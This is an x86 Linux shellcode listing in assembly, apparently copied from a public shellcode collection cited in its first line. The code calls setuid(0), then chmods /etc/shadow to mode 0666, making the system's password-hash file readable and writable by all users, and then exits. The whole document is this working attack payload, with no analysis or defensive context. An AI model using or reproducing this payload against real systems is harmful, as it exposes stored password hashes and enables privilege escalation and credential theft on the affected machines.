; http://shell-storm.org/shellcode/files/shellcode-624.php


xor    ebx, ebx
mov    al, 0x17
int    0x80
xor    eax,eax
push   eax
push   0x776f6461
push   0x68732f63
push   0x74652f2f
mov    ebx, esp
mov    cx, 0x1b6
mov    al, 0xf
int    0x80
inc    eax
int    0x80